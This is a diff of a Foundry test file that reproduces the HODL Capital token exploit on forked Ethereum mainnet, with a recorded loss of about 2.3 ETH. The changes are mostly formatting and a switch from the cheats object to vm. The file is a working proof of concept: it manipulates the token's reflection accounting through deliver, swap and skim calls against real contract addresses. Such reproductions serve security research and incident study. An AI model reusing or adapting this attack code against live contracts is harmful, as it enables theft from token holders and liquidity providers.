@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo -- Total Lost : ~2.3 ETH
 // Attacker : https://etherscan.io/address/0x4e998316ec31d2f3078f8f57b952bfae54728be1
@@ -24,8 +23,6 @@ interface IHODL is IERC20 {
 
 contract HODLCapitalExploit is Test {
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     IAaveFlashloan aavePool = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
     IUniswapV2Pair hodl_weth = IUniswapV2Pair(0x28E6cAB57d87E6F85ff650Fb0a7be9BE5e1897d4);
     IHODL hodl = IHODL(0xEdA47E13fD1192E32226753dC2261C4A14908fb7);
@@ -40,17 +37,17 @@ contract HODLCapitalExploit is Test {
     uint256 times;
 
     function setUp() public {
-        cheats.createSelectFork("mainnet");
+        vm.createSelectFork("mainnet");
 
-        cheats.label(address(aavePool), "AavePoolV3");
-        cheats.label(address(hodl_weth), "HODL-WETH UniswapPair");
-        cheats.label(address(hodl), "HODL");
-        cheats.label(address(weth), "WETH");
-        cheats.label(address(router), "UniswapV2Router");
+        vm.label(address(aavePool), "AavePoolV3");
+        vm.label(address(hodl_weth), "HODL-WETH UniswapPair");
+        vm.label(address(hodl), "HODL");
+        vm.label(address(weth), "WETH");
+        vm.label(address(router), "UniswapV2Router");
     }
 
     function testExploit() public {
-        cheats.rollFork(17_220_892);
+        vm.rollFork(17_220_892);
         emit log_named_decimal_uint("Attacker ETH balance before exploit", weth.balanceOf(address(this)), 18);
         // console.log("excludedFromFee:", hodl.isExcludedFromFee(excludedFromFeeAddress));
         // console.log("excluded:", hodl.isExcluded(excludedFromFeeAddress));
@@ -60,11 +57,11 @@ contract HODLCapitalExploit is Test {
         emit log_named_decimal_uint("Attacker ETH balance after exploit", weth.balanceOf(address(this)), 18);
     }
 
-    function getAmountIn(
-        uint256 amountOut,
-        uint256 reserveIn,
-        uint256 reserveOut
-    ) internal pure returns (uint256 amountIn) {
+    function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut)
+        internal
+        pure
+        returns (uint256 amountIn)
+    {
         require(amountOut > 0, "UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT");
         require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
         uint256 numerator = reserveIn * amountOut * 1000;
@@ -72,11 +69,11 @@ contract HODLCapitalExploit is Test {
         amountIn = (numerator / denominator) + 1;
     }
 
-    function getAmountOut(
-        uint256 amountIn,
-        uint256 reserveIn,
-        uint256 reserveOut
-    ) internal pure returns (uint256 amountOut) {
+    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
+        internal
+        pure
+        returns (uint256 amountOut)
+    {
         require(amountIn > 0, "UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT");
         require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
         uint256 amountInWithFee = amountIn * 997;
@@ -97,9 +94,9 @@ contract HODLCapitalExploit is Test {
         emit log_named_uint("Reserve0", reserve0);
         emit log_named_uint("Reserve1", reserve1);
         // uint256 amountIn = getAmountIn(amount1000 / 100000 * 10001, 13387083970661484684, 999631170221975669182);
-        uint256 amountIn = getAmountIn(amount1000 / 100_000 * 10_001, reserve0, reserve1);
+        uint256 amountIn = getAmountIn((amount1000 / 100_000) * 10_001, reserve0, reserve1);
         weth.transfer(address(hodl_weth), amountIn);
-        hodl_weth.swap(0, amount1000 / 100_000 * 10_001, address(this), new bytes(0));
+        hodl_weth.swap(0, (amount1000 / 100_000) * 10_001, address(this), new bytes(0));
         hodl.transfer(excludedFromFeeAddress, 1);
         rTotal = hodl.reflectionFromToken(amount1000, false);
         uint256 attackerBalance = hodl.balanceOf(address(this));
@@ -150,9 +147,9 @@ contract HODLCapitalExploit is Test {
         func1c44(2, 1007);
 
         (reserve0, reserve1,) = hodl_weth.getReserves();
-        amountIn = getAmountIn(reserve1 * 9000 / 10_000, reserve0, reserve1);
+        amountIn = getAmountIn((reserve1 * 9000) / 10_000, reserve0, reserve1);
         weth.transfer(address(hodl_weth), amountIn);
-        hodl_weth.swap(0, reserve1 * 9000 / 10_000, excludedFromFeeAddress, new bytes(0));
+        hodl_weth.swap(0, (reserve1 * 9000) / 10_000, excludedFromFeeAddress, new bytes(0));
 
         for (uint256 i = 0; i < 15; i++) {
             func2574(900);
@@ -189,39 +186,36 @@ contract HODLCapitalExploit is Test {
 
     function func1c44(uint256 v0, uint256 v1) internal {
         slot8 = v1;
-        uint256 v3 = hodl.tokenFromReflection(rTotal / 100 * v0);
+        uint256 v3 = hodl.tokenFromReflection((rTotal / 100) * v0);
         hodl_weth.swap(0, v3, address(this), new bytes(1));
         hodl.transfer(excludedFromFeeAddress, 1);
     }
 
     function func1eae(uint256 v0) internal {
         (uint256 reserve0, uint256 reserve1,) = hodl_weth.getReserves();
-        uint256 amountIn = getAmountIn(amount1000 / 100_000 * v0, reserve0, reserve1);
+        uint256 amountIn = getAmountIn((amount1000 / 100_000) * v0, reserve0, reserve1);
         weth.transfer(address(hodl_weth), amountIn);
-        hodl_weth.swap(0, amount1000 / 100_000 * v0, address(this), new bytes(0));
+        hodl_weth.swap(0, (amount1000 / 100_000) * v0, address(this), new bytes(0));
         hodl.transfer(excludedFromFeeAddress, 1);
     }
 
     function func2574(uint256 v0) internal {
-        hodl.deliver(amount1000 * v0 / 1000);
+        hodl.deliver((amount1000 * v0) / 1000);
         hodl_weth.skim(excludedFromFeeAddress);
     }
 
     function func26cd(uint256 v0) internal {
-        hodl.deliver(amount1000 * v0 / 1000);
+        hodl.deliver((amount1000 * v0) / 1000);
     }
 
-    function uniswapV2Call(
-        address, /*sender*/
-        uint256, /*amount0*/
-        uint256, /*amount1*/
-        bytes calldata /*data*/
-    ) external {
+    function uniswapV2Call(address, /*sender*/ uint256, /*amount0*/ uint256, /*amount1*/ bytes calldata /*data*/ )
+        external
+    {
         if (times > 5) {
             if (times <= 25) {
                 uint256 pairBalance = hodl.balanceOf(address(hodl_weth));
                 (, uint256 reserve1,) = hodl_weth.getReserves();
-                hodl.deliver((reserve1 - pairBalance) * slot8 / 1000);
+                hodl.deliver(((reserve1 - pairBalance) * slot8) / 1000);
                 times += 1;
             }
         } else {
@@ -232,7 +226,7 @@ contract HODLCapitalExploit is Test {
             uint256 pairBalance = hodl.balanceOf(address(hodl_weth));
             (uint256 reserve0, uint256 reserve1,) = hodl_weth.getReserves();
             uint256 amountIn = getAmountIn(reserve1 - pairBalance, reserve0, reserve1);
-            weth.transfer(address(hodl_weth), amountIn * slot8 / 1000);
+            weth.transfer(address(hodl_weth), (amountIn * slot8) / 1000);
             times += 1;
         }
     }
